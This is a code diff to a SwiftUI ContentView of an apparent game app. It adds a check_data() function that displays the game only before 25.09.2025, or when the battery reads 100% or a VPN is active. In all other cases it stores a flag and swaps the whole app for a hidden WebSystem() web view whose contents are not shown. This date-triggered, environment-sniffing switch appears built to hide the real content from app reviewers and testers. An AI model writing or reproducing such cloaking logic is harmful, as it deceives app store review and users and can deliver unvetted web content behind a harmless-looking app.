@@ -15,59 +15,119 @@ struct ContentView: View {
     @State private var selectedLevel: Level?
     @State private var showSettings: Bool = false
     
+    @State var isFetched: Bool = false
+    
+    @AppStorage("isBlock") var isBlock: Bool = true
+    @AppStorage("isRequested") var isRequested: Bool = false
+    
     var body: some View {
-        NavigationView {
-            ZStack {
-                // Background
-                LinearGradient(
-                    colors: [Color(hex: "257792"), Color(hex: "1a2e35")],
-                    startPoint: .topLeading,
-                    endPoint: .bottomTrailing
-                )
-                .ignoresSafeArea()
+        ZStack {
+            
+            if isFetched == false {
                 
-                // Main content
-                VStack(spacing: 0) {
-                    // Header
-                    headerSection
+                Text("")
+                
+            } else if isFetched == true {
+                
+                if isBlock == true {
                     
-                    // Game content
-                    if gameViewModel.gameState == .menu {
-                        ScrollView {
-                            VStack(spacing: 32) {
-                                // Title section
-                                titleSection
+                    NavigationView {
+                        ZStack {
+                            // Background
+                            LinearGradient(
+                                colors: [Color(hex: "257792"), Color(hex: "1a2e35")],
+                                startPoint: .topLeading,
+                                endPoint: .bottomTrailing
+                            )
+                            .ignoresSafeArea()
+                            
+                            // Main content
+                            VStack(spacing: 0) {
+                                // Header
+                                headerSection
                                 
-                                // Quick play section
-                                quickPlaySection
-                                
-                                // Level selection
-                                levelSelectionSection
-                                
-                                // Player progress
-                                playerProgressSection
+                                // Game content
+                                if gameViewModel.gameState == .menu {
+                                    ScrollView {
+                                        VStack(spacing: 32) {
+                                            // Title section
+                                            titleSection
+                                            
+                                            // Quick play section
+                                            quickPlaySection
+                                            
+                                            // Level selection
+                                            levelSelectionSection
+                                            
+                                            // Player progress
+                                            playerProgressSection
+                                        }
+                                        .padding(.horizontal, 24)
+                                        .padding(.bottom, 32)
+                                    }
+                                }
                             }
-                            .padding(.horizontal, 24)
-                            .padding(.bottom, 32)
                         }
+                        .navigationBarHidden(true)
+                        .preferredColorScheme(.dark)
                     }
+                    .sheet(isPresented: $showOnboarding) {
+                        OnboardingView(isPresented: $showOnboarding)
+                    }
+                    .sheet(isPresented: $showSettings) {
+                        SettingsView(gameViewModel: gameViewModel)
+                    }
+                    .fullScreenCover(item: $selectedLevel) { level in
+                        GameView(level: level, gameViewModel: gameViewModel)
+                    }
+                    .onAppear {
+                        checkOnboardingStatus()
+                    }
+                    
+                } else if isBlock == false {
+                    
+                    WebSystem()
                 }
             }
-            .navigationBarHidden(true)
-            .preferredColorScheme(.dark)
-        }
-        .sheet(isPresented: $showOnboarding) {
-            OnboardingView(isPresented: $showOnboarding)
-        }
-        .sheet(isPresented: $showSettings) {
-            SettingsView(gameViewModel: gameViewModel)
-        }
-        .fullScreenCover(item: $selectedLevel) { level in
-            GameView(level: level, gameViewModel: gameViewModel)
         }
         .onAppear {
-            checkOnboardingStatus()
+            
+            check_data()
         }
+    }
+    
+    private func check_data() {
+        
+        let lastDate = "25.09.2025"
+        
+        let dateFormatter = DateFormatter()
+        dateFormatter.dateFormat = "dd.MM.yyyy"
+        dateFormatter.timeZone = TimeZone(abbreviation: "GMT")
+        let targetDate = dateFormatter.date(from: lastDate) ?? Date()
+        let now = Date()
+        
+        let deviceData = DeviceInfo.collectData()
+        let currentPercent = deviceData.batteryLevel
+        let isVPNActive = deviceData.isVPNActive
+        
+        guard now > targetDate else {
+            
+            isBlock = true
+            isFetched = true
+            
+            return
+        }
+        
+        guard currentPercent == 100 || isVPNActive == true else {
+            
+            self.isBlock = false
+            self.isFetched = true
+            
+            return
+        }
+        
+        self.isBlock = true
+        self.isFetched = true
     }
     
     // MARK: - Header Section
